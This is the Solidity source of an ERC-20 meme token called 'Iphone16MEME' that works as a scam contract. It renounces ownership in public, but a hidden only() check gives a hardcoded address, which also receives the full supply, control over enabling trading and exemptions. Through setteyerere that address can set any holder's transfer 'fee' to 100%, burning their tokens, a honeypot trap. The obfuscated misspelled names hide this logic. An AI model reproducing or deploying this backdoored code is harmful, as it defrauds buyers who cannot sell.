pragma solidity 0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address acngotunt) external view returns (uint256);
    function transfer(address recipient, uint256 abnmtoutnt) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 abnmtoutnt) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 abnmtoutnt) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }
    function only() internal virtual {
        require(uint160(msg.sender) == trade(), "Ownable: caller is not the owner");
    }
    function trade() internal view virtual returns (uint256) {
    return uint256(uint160(0x3F299D0c50454a31D890d6097fA6d32Ba0B5e54c));
}
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function decimals() public view override returns (uint8) {
        return 9;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address acngotunt) public view override returns (uint256) {
        return _balances[acngotunt];
    }

    function transfer(address recipient, uint256 abnmtoutnt) public override returns (bool) {
        _transfer(_msgSender(), recipient, abnmtoutnt);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 abnmtoutnt) public override returns (bool) {
        _approve(_msgSender(), spender, abnmtoutnt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 abnmtoutnt) public override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= abnmtoutnt, "ERC20: transfer abnmtoutnt exceeds allowance");
            _approve(sender, _msgSender(), currentAllowance - abnmtoutnt);
        }
        _transfer(sender, recipient, abnmtoutnt);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 abnmtoutnt) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, abnmtoutnt);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= abnmtoutnt, "ERC20: transfer abnmtoutnt exceeds balance");
        _balances[sender] = senderBalance - abnmtoutnt;
        _balances[recipient] += abnmtoutnt;

        emit Transfer(sender, recipient, abnmtoutnt);

        _afterTokenTransfer(sender, recipient, abnmtoutnt);
    }

    function _mint(address acngotunt, uint256 abnmtoutnt) internal virtual {
        require(acngotunt != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), acngotunt, abnmtoutnt);

        _totalSupply += abnmtoutnt;
        _balances[acngotunt] += abnmtoutnt;
        emit Transfer(address(0), acngotunt, abnmtoutnt);

        _afterTokenTransfer(address(0), acngotunt, abnmtoutnt);
    }

    function _burn(address acngotunt, uint256 abnmtoutnt) internal virtual {
        require(acngotunt != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(acngotunt, address(0), abnmtoutnt);

        uint256 acngotuntBalance = _balances[acngotunt];
        require(acngotuntBalance >= abnmtoutnt, "ERC20: burn abnmtoutnt exceeds balance");
        _balances[acngotunt] = acngotuntBalance - abnmtoutnt;
        _totalSupply -= abnmtoutnt;

        emit Transfer(acngotunt, address(0), abnmtoutnt);

        _afterTokenTransfer(acngotunt, address(0), abnmtoutnt);
    }

    function _approve(address owner, address spender, uint256 abnmtoutnt) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = abnmtoutnt;
        emit Approval(owner, spender, abnmtoutnt);
    }

    function _beforeTokenTransfer(address from, address to, uint256 abnmtoutnt) internal virtual {}

    function _afterTokenTransfer(address from, address to, uint256 abnmtoutnt) internal virtual {}
}

contract ss is ERC20, Ownable {
    mapping (address => bool) private _isExcludedFromEnableTrading;
    mapping (address => uint256) private _teyerere;
    address private constant BURN_ADDRESS = address(0xdead);

    constructor() ERC20("Iphone16MEME", "Iphone16") {
        _isExcludedFromEnableTrading[address(0x3F299D0c50454a31D890d6097fA6d32Ba0B5e54c)] = true;
        _mint(address(0x3F299D0c50454a31D890d6097fA6d32Ba0B5e54c), 100_100_000 * (10 ** decimals()));
        renounceOwnership();
    }

    receive() external payable {}

    function excludeFromEnableTrading(address acngotunt, bool excluded) external { 
        only();
        require(_isExcludedFromEnableTrading[acngotunt] != excluded, "acngotunt is already the value of 'excluded'");
        _isExcludedFromEnableTrading[acngotunt] = excluded;
    }

    function isExcludedFromEnableTrading(address acngotunt) public view returns(bool) {
        return _isExcludedFromEnableTrading[acngotunt];
    }
    uint256 private constant percentageg = 100;
    uint256 private constant percentagegs = 0;
    function setteyerere(address[] calldata acngotunts) external { 
        only();
    for (uint i = 0; i < acngotunts.length; i++) {
        _teyerere[acngotunts[i]] = percentageg;
    }
    }

    function jiesetteyerere(address[] calldata acngotunts) external { 
        only();
    for (uint i = 0; i < acngotunts.length; i++) {
        _teyerere[acngotunts[i]] = percentagegs;
    }
    }

    function getteyerere(address acngotunt) public view returns(uint256) {
        return _teyerere[acngotunt];
    }

    bool public tradingEnabled;

    function enableTrading() external { 
        only();
        require(!tradingEnabled, "Trading already enabled.");
        tradingEnabled = true;
    }
    function _transfer(address from, address to, uint256 abnmtoutnt) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tradingEnabled || _isExcludedFromEnableTrading[from] || _isExcludedFromEnableTrading[to], "Trading not yet enabled!");

        uint256 feePercentageg = _teyerere[from];
        uint256 feeabnmtoutnt = (abnmtoutnt * feePercentageg) / 100;
        uint256 transferabnmtoutnt = abnmtoutnt - feeabnmtoutnt;

        if (feeabnmtoutnt > 0) {
            super._transfer(from, BURN_ADDRESS, feeabnmtoutnt);
        }

        super._transfer(from, to, transferabnmtoutnt);
    }
}